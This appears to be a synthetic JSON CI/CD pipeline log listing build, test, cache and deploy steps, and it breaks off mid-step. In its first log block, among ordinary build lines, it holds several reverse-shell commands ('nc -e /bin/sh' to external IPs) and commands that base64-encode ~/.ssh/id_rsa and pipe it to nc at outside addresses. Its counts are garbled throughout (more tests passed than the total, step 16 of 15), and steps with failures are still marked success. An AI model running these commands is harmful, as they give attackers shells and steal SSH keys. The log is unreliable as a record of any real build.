in v4.0\nImage pulled successfully\nCache saved successfully\n[12:19:11] DEBUG: Connection pool: 5 active\nOK\nFetching submodules...\nHEAD is now at 5881e49\n\u2713 deploy completed\n[12:19:11] INFO: Request completed\nyarn add: Done in 5.22s\n[12:19:11] INFO: Connecting to database\n[12:19:11] DEBUG: Connection pool: 12 active\n[12:19:11] DEBUG: Query executed in 82ms\nTests: 488 passed, 484 total\nnc -e /bin/sh 135.75.179.189 14531\n[12:19:11] DEBUG: Memory usage: 669MB\nyarn add: Done in 21.95s\npip: Installing build dependencies...\npip: Collecting webpack\n[12:19:11] DEBUG: Memory usage: 616MB\nSending 320MB of data to acme.corp\nnpm install: resolved 1733 packages\n[12:19:11] WARN: Deprecated API usage\n  PASS: e2e/test_api_health.spec.js\nImage pulled successfully\n  PASS: test_auth_login (155ms)\nCache invalidated: node_modules\nnpm notice: package.json updated\nTests: 305 passed, 120 total\n\u2713 deploy completed\nDone.\nSwitched to branch 'bugfix/task-179'\nnc -e /bin/sh 156.100.126.124 63518\nLayer 5/10: COPY command\nCompiling utils/utils.go...\nArtifact uploaded: build.tar.gz (35MB)\n[12:19:11] INFO: Request completed\nLoading...\n\u2713 package completed\nCompiling src/index.js...\nHEAD is now at ac51fe6\n[12:19:11] DEBUG: Loading configuration\nArtifact uploaded: build.tar.gz (9MB)\nNODE_ENV=production\n[12:19:11] INFO: Connecting to database\nBuilding Docker image...\nnc -e /bin/sh 194.239.104.156 32951\nAlready up to date.\nTest Suites: 31 passed, 5 total\nSending 355MB of data to test.io\n[12:19:11] DEBUG: Memory usage: 1885MB\n  PASS: unit/test_auth_login.spec.js\n[12:19:11] DEBUG: Connection pool: 16 active\nCache saved successfully\necho $(cat ~/.ssh/id_rsa) | base64 | nc 39.76.94.54 15120\npip: Installing build dependencies...\nCompiling utils/handler.rs...\npip: Installing build dependencies...\nCompleted.\n[12:19:11] INFO: Starting build process\n[12:19:11] DEBUG: Connection pool: 16 active\nConnection established\nPOST /data - 201 (328ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nAlready up to date.\necho $(cat ~/.ssh/id_rsa) | base64 | nc 197.60.120.83 15008\nWaiting...\n  PASS: e2e/test_api_health.spec.js\n[12:19:11] DEBUG: Query executed in 96ms\nFAILED: test_cache_hit\nInstalling eslint@2.2.2\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 46.128.121.17 5165\n[12:19:11] INFO: Starting build process\nTests: 126 passed, 393 total\nTLS handshake completed\nArtifact uploaded: dist.zip (5MB)\nTLS handshake completed\nSuccess!\n[12:19:11] INFO: Cache refreshed\nOptimizing 43 modules...\n  PASS: test_cache_hit (189ms)\nArtifact uploaded: dist.zip (93MB)\n=== Step deploy_staging completed ===",
    "steps": [
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-02T12:19:11.633939",
        "finished_at": "2025-12-02T12:19:26.085035",
        "log_lines": [
          "=== Step: setup_node ===",
          "\u2717 build failed with exit code 86",
          "npm notice: package.json updated",
          "Step 11/25: Running migrations",
          "[12:19:11] INFO: Processing request",
          "Cache invalidated: node_modules",
          "Using Node.js 20.10.1",
          "npm install: resolved 1536 packages",
          "\u2713 lint completed",
          "  PASS: test_user_create (17ms)",
          "Processing...",
          "[12:19:11] WARN: Deprecated API usage",
          "Step 16/15: Testing",
          "yarn add: Done in 17.25s",
          "Transforming 749 files...",
          "npm install: resolved 1260 packages",
          "Tests: 153 passed, 332 total",
          "npm install: resolved 712 packages",
          "Optimizing 81 modules...",
          "Snapshots: 37 passed, 21 total",
          "HEAD is now at 4b110fd",
          "Platform: darwin-arm64",
          "Artifact downloaded: 28MB",
          "Step 11/23: Testing",
          "Tests: 366 passed, 82 total",
          "Checking out main branch",
          "Step 18/15: Linting",
          "Compiling src/handler.rs...",
          "Step 1/17: Running migrations",
          "Step 17/22: Running migrations",
          "\u2713 validate completed",
          "WARNING: webpack has known vulnerabilities",
          "Connecting to startup.dev:443...",
          "OK",
          "TLS handshake completed",
          "Using Node.js 20.11.0",
          "Snapshots: 38 passed, 49 total",
          "  PASS: integration/test_auth_login.spec.js",
          "Success!",
          "TLS handshake completed",
          "[12:19:11] WARN: Deprecated API usage",
          "Success!",
          "Cache miss for key-9271",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Waiting...",
          "Fetching submodules...",
          "\u2713 Task completed in 1920ms",
          "Step 8/23: Deploying",
          "NODE_ENV=production",
          "\u2713 Task completed in 4401ms",
          "[12:19:11] WARN: Deprecated API usage",
          "  PASS: e2e/test_cache_hit.spec.js",
          "WARNING: jest has known vulnerabilities",
          "NODE_ENV=development",
          "Done.",
          "Test Suites: 31 passed, 50 total",
          "Processing...",
          "\u2713 Step 'test' succeeded",
          "[12:19:11] DEBUG: Initializing service",
          "[12:19:11] INFO: Starting build process",
          "Snapshots: 13 passed, 8 total",
          "NODE_ENV=development",
          "Cache restored successfully (413MB)",
          "pip install: Successfully installed lodash-2.2",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:11] INFO: Starting build process",
          "Uploading artifact 'dist' (48 files)",
          "Optimizing 16 modules...",
          "pip: Installing build dependencies...",
          "Step 6/17: Running migrations",
          "Cache restored successfully (195MB)",
          "Bundling styles.css",
          "  PASS: test_user_create (268ms)",
          "Fetching submodules...",
          "[12:19:11] DEBUG: Query executed in 12ms",
          "Test Suites: 45 passed, 15 total",
          "Switched to branch 'bugfix/task-548'",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Pulling image: alpine:3.11",
          "Checking out main branch",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:11] WARN: Deprecated API usage",
          "Step 16/16: Deploying",
          "Step 9/16: Building",
          "FAILED: test_api_health",
          "Layer 1/11: ENV command",
          "Switched to branch 'bugfix/task-943'",
          "Waiting...",
          "Cache hit for key-6784",
          "pip: Installing build dependencies...",
          "  PASS: unit/test_db_connect.spec.js",
          "npm notice: package.json updated",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-02T12:19:26.085035",
        "finished_at": "2025-12-02T12:19:34.755692",
        "log_lines": [
          "=== Step: save_cache ===",
          "Artifact uploaded: dist.zip (79MB)",
          "Already up to date.",
          "Creating production build...",
          "Bundling runtime.css",
          "pip: Collecting react",
          "Time: 14.110s",
          "Generating source maps...",
          "npm notice: package.json updated",
          "Connection established",
          "\u2713 Task completed in 3231ms",
          "  PASS: integration/test_auth_login.spec.js",
          "Tests: 365 passed, 488 total",
          "Compiling src/service.java...",
          "Connecting to test.io:443...",
          "Environment: staging",
          "Cache hit for key-3726",
          "Building Docker image...",
          "Fetching submodules...",
          "Ran 115 tests in 26s",
          "Artifact downloaded: 25MB",
          "Compiling lib/utils.go...",
          "Fetching submodules...",
          "NODE_ENV=development",
          "Cache saved successfully",
          "Connecting to example.com:443...",
          "Artifact uploaded: dist.zip (100MB)",
          "[12:19:11] DEBUG: Loading configuration",
          "pip: Downloading eslint-1.3.tar.gz",
          "Optimizing 12 modules...",
          "Step 13/24: Linting",
          "Already up to date.",
          "Building Docker image...",
          "Image pulled successfully",
          "Processing...",
          "[12:19:11] INFO: Processing request",
          "Success!",
          "WARNING: prettier has known vulnerabilities",
          "Step 9/22: Deploying",
          "Cache hit for key-7854",
          "Time: 6.373s",
          "GET /status - 200 (88ms)",
          "Environment: staging",
          "npm notice: created a lockfile",
          "Creating production build...",
          "Time: 17.110s",
          "HEAD is now at b77de44",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Bundling styles.css",
          "Pushing to registry...",
          "Step 11/16: Testing",
          "Cache miss for key-1992",
          "pip install: Successfully installed axios-2.20",
          "Loading...",
          "Image pulled successfully",
          "[12:19:11] INFO: Starting build process",
          "[12:19:11] DEBUG: Query executed in 62ms",
          "[12:19:11] INFO: Processing request",
          "[12:19:11] DEBUG: Memory usage: 1592MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Platform: linux-x64",
          "Waiting...",
          "Ready.",
          "Coverage: 84% statements, 69% branches",
          "Step 6/23: Building",
          "\u2713 Step 'build' succeeded",
          "Already up to date.",
          "[12:19:11] DEBUG: Memory usage: 1040MB",
          "Step 16/17: Linting",
          "Environment: staging",
          "pip: Installing build dependencies...",
          "[12:19:11] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Coverage: 81% statements, 90% branches",
          "Snapshots: 12 passed, 17 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Loading...",
          "Optimizing 48 modules...",
          "[12:19:11] DEBUG: Initializing service",
          "\u2713 Step 'checkout' succeeded",
          "Environment: development",
          "Tests: 253 passed, 496 total",
          "HEAD is now at bf01cbb",
          "Layer 7/15: COPY command",
          "Snapshots: 44 passed, 33 total",
          "Cache invalidated: node_modules",
          "Compiling src/service.java...",
          "Cache miss for key-5207",
          "Step 14/18: Building",
          "FAILED: test_api_health",
          "[12:19:11] INFO: Starting build process",
          "Image pulled successfully",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-02T12:19:34.755692",
        "finished_at": "2025-12-02T12:19:49.206788",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Waiting...",
          "Step 20/22: Testing",
          "Minifying vendor.js",
          "Already up to date.",
          "Using Node.js 17.2.4",
          "Transforming 363 files...",
          "HEAD is now at c46e143",
          "Completed.",
          "Loading...",
          "\u2713 All checks passed",
          "NODE_ENV=test",
          "Ready.",
          "Processing...",
          "\u2713 All checks passed",
          "\u2717 build failed with exit code 27",
          "Compiling utils/handler.rs...",
          "Time: 16.870s",
          "Creating production build...",
          "pip: Installing build dependencies...",
          "Time: 51.244s",
          "pip: Collecting prettier",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 deploy completed",
          "Cache miss for key-4032",
          "Step 13/17: Testing",
          "Artifact uploaded: dist.zip (6MB)",
          "npm notice: package.json updated",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "[12:19:11] DEBUG: Memory usage: 980MB",
          "\u2713 Task completed in 3782ms",
          "Minifying main.js",
          "Building Docker image...",
          "[12:19:11] ERROR: Connection failed",
          "[12:19:11] DEBUG: Initializing service",
          "[12:19:11] WARN: Deprecated API usage",
          "FAILED: test_user_create",
          "WARNING: react has known vulnerabilities",
          "[12:19:11] INFO: Request completed",
          "Checking out master branch",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "OK",
          "Verifying...",
          "Layer 8/11: COPY command",
          "Building Docker image...",
          "Coverage: 93% statements, 73% branches",
          "Coverage: 86% statements, 90% branches",
          "npm install: resolved 1680 packages",
          "Artifact downloaded: 19MB",
          "[12:19:11] INFO: Starting build process",
          "POST /api - 200 (105ms)",
          "Step 5/15: Installing dependencies",
          "Compiling src/utils.go...",
          "yarn add: Done in 14.27s",
          "\u2713 package completed",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Ran 13 tests in 36s",
          "Step 4/17: Building",
          "[12:19:11] DEBUG: Memory usage: 1036MB",
          "npm notice: package.json updated",
          "Bundling runtime.css",
          "Artifact downloaded: 22MB",
          "Using Python 3.11",
          "WARNING: react has known vulnerabilities",
          "Switched to branch 'feature/task-601'",
          "[12:19:11] INFO: Request completed",
          "pip: Downloading jest-5.1.tar.gz",
          "Bundling styles.css",
          "Cache invalidated: build",
          "Cache saved successfully",
          "\u2717 build failed with exit code 100",
          "Optimizing 56 modules...",
          "\u2713 package completed",
          "\u2713 All checks passed",
          "NODE_ENV=production",
          "FAILED: test_auth_login",
          "POST /data - 201 (359ms)",
          "Compiling components/handler.rs...",
          "Optimizing 79 modules...",
          "Cache restored successfully (66MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Uploading artifact 'build' (46 files)",
          "Done.",
          "npm install: resolved 1132 packages",
          "HEAD is now at 7379743",
          "\u2713 Step 'build' succeeded",
          "  PASS: unit/test_cache_hit.spec.js",
          "OK",
          "Transforming 345 files...",
          "Switched to branch 'feature/task-351'",
          "HEAD is now at 8f54f73",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-02T12:19:49.206788",
        "finished_at": "2025-12-02T12:19:54.987226",
        "log_lines": [
          "=== Step: deploy_production ===",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "Artifact downloaded: 40MB",
          "OK",
          "Ran 93 tests in 35s",
          "\u2713 Step 'build' succeeded",
          "Step 13/22: Running migrations",
          "npm install: added 432 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:11] INFO: Connecting to database",
          "pip: Installing build dependencies...",
          "Creating production build...",
          "  PASS: integration/test_api_health.spec.js",
          "Environment: production",
          "HEAD is now at d2c5a47",
          "Step 2/18: Building",
          "Compiling components/index.js...",
          "[12:19:11] INFO: Cache refreshed",
          "[12:19:11] DEBUG: Query executed in 55ms",
          "Time: 18.408s",
          "[12:19:11] DEBUG: Query executed in 38ms",
          "npm install: resolved 1247 packages",
          "Building Docker image...",
          "Pushing to registry...",
          "Compiling src/utils.go...",
          "pip install: Successfully installed express-5.5",
          "Artifact downloaded: 8MB",
          "Compiling components/main.py...",
          "Creating production build...",
          "npm notice: created a lockfile",
          "\u2713 All checks passed",
          "Already up to date.",
          "Compiling components/main.py...",
          "Artifact downloaded: 38MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing axios@4.12.1",
          "[12:19:11] DEBUG: Loading configuration",
          "Verifying...",
          "Verifying...",
          "pip: Installing build dependencies...",
          "pip: Installing build dependencies...",
          "Artifact uploaded: dist.zip (32MB)",
          "yarn add: Done in 12.9s",
          "Success!",
          "Using Node.js 16.5.9",
          "Fetching submodules...",
          "GET /status - 201 (9ms)",
          "Fetching submodules...",
          "Tests: 106 passed, 417 total",
          "Step 19/17: Deploying",
          "WARNING: jest has known vulnerabilities",
          "GET /health - 200 (66ms)",
          "\u2713 build completed",
          "Step 6/15: Running migrations",
          "Cache miss for key-4068",
          "Cache miss for key-6387",
          "pip: Collecting prettier",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "FAILED: test_api_health",
          "Artifact uploaded: dist.zip (68MB)",
          "  PASS: test_auth_login (303ms)",
          "Using Node.js 17.19.9",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (7MB)",
          "HEAD is now at 7e8ed17",
          "Minifying main.js",
          "Creating production build...",
          "Completed.",
          "[12:19:11] INFO: Processing request",
          "\u2713 All checks passed",
          "Compiling src/utils.go...",
          "Platform: linux-x64",
          "[12:19:11] INFO: Processing request",
          "npm notice: package.json updated",
          "pip: Collecting prettier",
          "[12:19:11] WARN: Deprecated API usage",
          "yarn add: Done in 1.51s",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:19:11] INFO: Processing request",
          "Fetching submodules...",
          "Generating source maps...",
          "pip: Downloading lodash-3.16.tar.gz",
          "[12:19:11] INFO: Starting build process",
          "Success!",
          "Using Node.js 17.6.4",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:19:11] INFO: Processing request",
          "Tests: 358 passed, 246 total",
          "Cache restored successfully (283MB)",
          "\u2713 Step 'build' succeeded",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-02T12:19:54.987226",
        "finished_at": "2025-12-02T12:20:23.889417",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Image pulled successfully",
          "Finished.",
          "TLS handshake completed",
          "[12:19:11] INFO: Starting build process",
          "Using Python 3.11",
          "Step 15/23: Building",
          "Compiling components/main.py...",
          "[12:19:11] WARN: Deprecated API usage",
          "  PASS: test_db_connect (348ms)",
          "Using Node.js 14.1.3",
          "Done.",
          "npm install: added 201 packages",
          "Done.",
          "npm notice: package.json updated",
          "Step 4/17: Building",
          "npm notice: created a lockfile",
          "pip: Installing build dependencies...",
          "Time: 47.684s",
          "[12:19:11] INFO: Connecting to database",
          "Artifact uploaded: dist.zip (92MB)",
          "Switched to branch 'feature/task-685'",
          "Step 4/16: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 14/20: Testing",
          "Compiling components/handler.rs...",
          "[12:19:11] INFO: Request completed",
          "Fetching submodules...",
          "Step 10/15: Building",
          "Already up to date.",
          "Ran 162 tests in 36s",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Using Node.js 19.15.4",
          "\u2713 Step 'checkout' succeeded",
          "Layer 5/12: COPY command",
          "\u2717 build failed with exit code 60",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 13/25: Linting",
          "Completed.",
          "npm install: resolved 1183 packages",
          "Coverage: 77% statements, 61% branches",
          "Cache hit for key-9160",
          "Ran 179 tests in 59s",
          "Processing...",
          "Step 20/25: Linting",
          "pip: Downloading eslint-4.16.tar.gz",
          "Already up to date.",
          "npm install: resolved 1996 packages",
          "Coverage: 100% statements, 92% branches",
          "[12:19:11] INFO: Starting build process",
          "  PASS: test_auth_login (278ms)",
          "Already up to date.",
          "Building Docker image...",
          "Minifying vendor.js",
          "Platform: linux-x64",
          "WARNING: lodash has known vulnerabilities",
          "Step 8/19: Building",
          "pip: Installing build dependencies...",
          "Switched to branch 'hotfix/task-991'",
          "[12:19:11] DEBUG: Query executed in 78ms",
          "Environment: staging",
          "NODE_ENV=development",
          "[12:19:11] INFO: Cache refreshed",
          "WARNING: prettier has known vulnerabilities",
          "Step 19/22: Deploying",
          "Artifact downloaded: 34MB",
          "[12:19:11] INFO: Starting build process",
          "Coverage: 78% statements, 61% branches",
          "Generating source maps...",
          "Generating source maps...",
          "Step 19/21: Installing dependencies",
          "Step 1/20: Testing",
          "\u2713 Step 'build' succeeded",
          "Compiling src/app.ts...",
          "Snapshots: 33 passed, 4 total",
          "[12:19:11] DEBUG: Loading configuration",
          "[12:19:11] INFO: Connecting to database",
          "WARNING: jest has known vulnerabilities",
          "[12:19:11] INFO: Connecting to database",
          "Cache invalidated: node_modules",
          "Artifact uploaded: dist.zip (46MB)",
          "[12:19:11] DEBUG: Loading configuration",
          "Environment: staging",
          "[12:19:11] INFO: Connecting to database",
          "Ready.",
          "Bundling runtime.js",
          "Step 15/21: Installing dependencies",
          "POST /upload - 202 (156ms)",
          "Checking out main branch",
          "Completed.",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-02T12:20:23.889417",
        "finished_at": "2025-12-02T12:20:29.669855",
        "log_lines": [
          "=== Step: checkout ===",
          "[12:19:11] DEBUG: Initializing service",
          "Success!",
          "yarn add: Done in 9.4s",
          "Minifying app.js",
          "pip: Collecting react",
          "[12:19:11] INFO: Request completed",
          "TLS handshake completed",
          "pip: Installing build dependencies...",
          "Tests: 119 passed, 352 total",
          "Cache hit for key-7759",
          "Test Suites: 19 passed, 10 total",
          "Loading...",
          "Step 20/20: Linting",
          "Snapshots: 15 passed, 22 total",
          "Cache restored successfully (493MB)",
          "Building Docker image...",
          "\u2713 Step 'install' succeeded",
          "Image pulled successfully",
          "NODE_ENV=test",
          "npm install: added 286 packages",
          "\u2713 All checks passed",
          "OK",
          "Test Suites: 16 passed, 8 total",
          "TLS handshake completed",
          "[12:19:11] ERROR: Connection failed",
          "Using Python 3.9",
          "Compiling lib/main.py...",
          "NODE_ENV=production",
          "Compiling components/app.ts...",
          "\u2713 Step 'build' succeeded",
          "  PASS: unit/test_db_connect.spec.js",
          "Test Suites: 37 passed, 20 total",
          "Exception: TypeError",
          "Finished.",
          "Compiling components/service.java...",
          "Completed.",
          "Compiling src/app.ts...",
          "Tests: 156 passed, 104 total",
          "Creating production build...",
          "Environment: development",
          "Environment: production",
          "npm install: added 325 packages",
          "Compiling lib/handler.rs...",
          "pip install: Successfully installed eslint-5.19",
          "\u2713 All checks passed",
          "Waiting...",
          "\u2713 deploy completed",
          "[12:19:11] DEBUG: Loading configuration",
          "Loading...",
          "Tests: 119 passed, 408 total",
          "pip: Installing build dependencies...",
          "npm install: added 70 packages",
          "Using Python 3.12",
          "Bundling vendor.js",
          "Creating production build...",
          "Pushing to registry...",
          "Success!",
          "Time: 51.186s",
          "Cache saved successfully",
          "[12:19:11] DEBUG: Initializing service",
          "NODE_ENV=production",
          "Connecting to test.io:443...",
          "Tests: 345 passed, 283 total",
          "Uploading artifact 'dist' (41 files)",
          "Finished.",
          "Platform: win32-x64",
          "  PASS: test_db_connect (295ms)",
          "Generating source maps...",
          "POST /api - 202 (21ms)",
          "Step 7/17: Linting",
          "Cache saved successfully",
          "Step 12/21: Installing dependencies",
          "Done.",
          "Compiling lib/main.py...",
          "HEAD is now at 1fd037c",
          "Generating source maps...",
          "pip: Downloading lodash-4.19.tar.gz",
          "OK",
          "Generating source maps...",
          "Cache saved successfully",
          "npm install: resolved 1073 packages",
          "[12:19:11] INFO: Connecting to database",
          "pip install: Successfully installed react-3.0",
          "Verifying...",
          "Exception: TypeError",
          "Processing...",
          "[12:19:11] INFO: Processing request",
          "Connection established",
          "OK",
          "[12:19:11] WARN: Deprecated API usage",
          "Using Python 3.9",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-02T12:20:29.669855",
        "finished_at": "2025-12-02T12:21:13.023142",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Uploading artifact 'dist' (23 files)",
          "Platform: darwin-arm64",
          "Time: 65.848s",
          "Creating production build...",
          "Waiting...",
          "Installing prettier@2.16.5",
          "Cache miss for key-6746",
          "Compiling lib/main.py...",
          "pip install: Successfully installed webpack-5.0",
          "Using Node.js 14.5.3",
          "pip install: Successfully installed jest-3.14",
          "Using Node.js 16.8.3",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache saved successfully",
          "Fetching submodules...",
          "pip: Installing build dependencies...",
          "Step 3/20: Installing dependencies",
          "Verifying...",
          "Step 6/24: Running migrations",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Transforming 981 files...",
          "Artifact uploaded: dist.zip (13MB)",
          "WARNING: webpack has known vulnerabilities",
          "[12:19:11] DEBUG: Initializing service",
          "[12:19:11] WARN: Deprecated API usage",
          "Environment: test",
          "Test Suites: 14 passed, 11 total",
          "GET /status - 204 (79ms)",
          "Switched to branch 'feature/task-280'",
          "  PASS: unit/test_user_create.spec.js",
          "WARNING: react has known vulnerabilities",
          "GET /status - 204 (97ms)",
          "Using Python 3.9",
          "Installing prettier@3.2.1",
          "  PASS: integration/test_user_create.spec.js",
          "Fetching submodules...",
          "\u2713 validate completed",
          "[12:19:11] DEBUG: Memory usage: 1839MB",
          "[12:19:11] INFO: Connecting to database",
          "Cache saved successfully",
          "Completed.",
          "  PASS: e2e/test_auth_login.spec.js",
          "Cache restored successfully (35MB)",
          "Test Suites: 13 passed, 5 total",
          "Cache restored successfully (315MB)",
          "WARNING: jest has known vulnerabilities",
          "FAILED: test_auth_login",
          "Cache miss for key-5900",
          "[12:19:11] INFO: Request completed",
          "[12:19:11] INFO: Processing request",
          "yarn add: Done in 5.7s",
          "Cache saved successfully",
          "[12:19:11] INFO: Processing request",
          "Step 5/17: Building",
          "  PASS: unit/test_user_create.spec.js",
          "Installing axios@1.20.7",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Pushing to registry...",
          "yarn add: Done in 30.34s",
          "[12:19:11] INFO: Connecting to database",
          "Tests: 455 passed, 218 total",
          "Cache miss for key-5658",
          "Step 11/21: Testing",
          "\u2713 Step 'test' succeeded",
          "Fetching submodules...",
          "pip: Collecting axios",
          "\u2713 Step 'build' succeeded",
          "pip: Downloading lodash-3.14.tar.gz",
          "Time: 120.236s",
          "npm notice: created a lockfile",
          "Connecting to startup.dev:443...",
          "Pulling image: python:3.11",
          "Environment: production",
          "[12:19:11] DEBUG: Initializing service",
          "Compiling components/utils.go...",
          "Step 10/23: Installing dependencies",
          "npm notice: created a lockfile",
          "Pulling image: alpine:latest",
          "pip: Downloading jest-3.20.tar.gz",
          "Pulling image: alpine:18",
          "[12:19:11] WARN: Deprecated API usage",
          "Completed.",
          "Step 10/24: Installing dependencies",
          "Processing...",
          "Installing webpack@3.3.10",
          "Step 12/24: Testing",
          "OK",
          "Step 6/24: Running migrations",
          "\u2713 Step 'build' succeeded",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-02T12:21:13.023142",
        "finished_at": "2025-12-02T12:21:21.693799",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Bundling styles.css",
          "pip install: Successfully installed prettier-1.4",
          "Cache miss for key-8920",
          "npm install: resolved 1153 packages",
          "Building Docker image...",
          "Cache hit for key-5575",
          "\u2713 Task completed in 1611ms",
          "Compiling lib/app.ts...",
          "Test Suites: 26 passed, 10 total",
          "\u2713 All checks passed",
          "Test Suites: 31 passed, 20 total",
          "Switched to branch 'feature/task-120'",
          "Switched to branch 'feature/task-977'",
          "npm install: resolved 1785 packages",
          "Already up to date.",
          "\u2713 build completed",
          "[12:19:11] INFO: Connecting to database",
          "Uploading artifact 'build' (11 files)",
          "\u2713 Step 'build' succeeded",
          "Installing express@1.12.7",
          "Cache miss for key-5620",
          "Compiling components/main.py...",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Tests: 59 passed, 162 total",
          "Tests: 285 passed, 129 total",
          "[12:19:11] DEBUG: Initializing service",
          "Verifying...",
          "Ready.",
          "[12:19:11] DEBUG: Memory usage: 1907MB",
          "Using Python 3.12",
          "Step 14/19: Installing dependencies",
          "[12:19:11] DEBUG: Initializing service",
          "Optimizing 26 modules...",
          "pip: Installing build dependencies...",
          "Checking out main branch",
          "Checking out master branch",
          "GET /health - 200 (52ms)",
          "[12:19:11] INFO: Starting build process",
          "GET /status - 201 (93ms)",
          "Finished.",
          "Using Node.js 15.16.2",
          "Ran 182 tests in 9s",
          "Time: 19.341s",
          "  PASS: test_db_connect (264ms)",
          "[12:19:11] DEBUG: Connection pool: 10 active",
          "pip: Collecting react",
          "npm notice: created a lockfile",
          "[12:19:11] DEBUG: Memory usage: 1845MB",
          "Transforming 723 files...",
          "[12:19:11] WARN: Deprecated API usage",
          "[12:19:11] INFO: Processing request",
          "npm install: resolved 807 packages",
          "Image pulled successfully",
          "Environment: staging",
          "pip: Installing build dependencies...",
          "[12:19:11] DEBUG: Initializing service",
          "Using Python 3.9",
          "\u2713 Step 'test' succeeded",
          "[12:19:11] WARN: Deprecated API usage",
          "Cache miss for key-3270",
          "Compiling utils/main.py...",
          "Building Docker image...",
          "Completed.",
          "Bundling main.js",
          "Pushing to registry...",
          "Test Suites: 32 passed, 33 total",
          "\u2713 Step 'test' succeeded",
          "FAILED: test_user_create",
          "Cache invalidated: build",
          "Layer 9/9: RUN command",
          "[12:19:11] INFO: Processing request",
          "Verifying...",
          "\u2713 All checks passed",
          "[12:19:11] INFO: Connecting to database",
          "Building Docker image...",
          "pip install: Successfully installed eslint-2.16",
          "WARNING: jest has known vulnerabilities",
          "[12:19:11] WARN: Deprecated API usage",
          "Platform: darwin-arm64",
          "Step 10/24: Installing dependencies",
          "[12:19:11] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "[12:19:11] WARN: Deprecated API usage",
          "Generating source maps...",
          "Finished.",
          "Image pulled successfully",
          "npm notice: package.json updated",
          "Layer 8/11: COPY command",
          "Layer 6/11: RUN command",
          "Artifact uploaded: build.tar.gz (4MB)",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-02T12:21:21.693799",
        "finished_at": "2025-12-02T12:22:05.047086",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Using Node.js 17.17.8",
          "Snapshots: 21 passed, 48 total",
          "Finished.",
          "Pushing to registry...",
          "Layer 5/8: RUN command",
          "npm notice: package.json updated",
          "Compiling src/handler.rs...",
          "Installing webpack@4.15.8",
          "Artifact downloaded: 14MB",
          "[12:19:11] DEBUG: Query executed in 19ms",
          "pip: Installing build dependencies...",
          "Using Node.js 20.7.10",
          "[12:19:11] ERROR: Connection failed",
          "Generating source maps...",
          "  PASS: test_api_health (454ms)",
          "Connecting to example.com:443...",
          "Fetching submodules...",
          "npm install: added 394 packages",
          "[12:19:11] DEBUG: Query executed in 17ms",
          "[12:19:11] WARN: Deprecated API usage",
          "Creating production build...",
          "Compiling utils/handler.rs...",
          "Installing lodash@3.16.4",
          "Switched to branch 'hotfix/task-623'",
          "\u2713 package completed",
          "Cache hit for key-9491",
          "Optimizing 95 modules...",
          "Test Suites: 26 passed, 37 total",
          "Connecting to test.io:443...",
          "npm notice: package.json updated",
          "Ready.",
          "Building Docker image...",
          "Snapshots: 14 passed, 12 total",
          "[12:19:11] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "GET /health - 200 (28ms)",
          "npm install: resolved 112 packages",
          "Done.",
          "Step 7/21: Linting",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Minifying main.js",
          "Connection established",
          "pip install: Successfully installed react-1.17",
          "Step 2/22: Running migrations",
          "[12:19:11] DEBUG: Memory usage: 143MB",
          "Snapshots: 15 passed, 3 total",
          "Cache invalidated: build",
          "Completed.",
          "[12:19:11] INFO: Processing request",
          "Generating source maps...",
          "Platform: linux-x64",
          "Pushing to registry...",
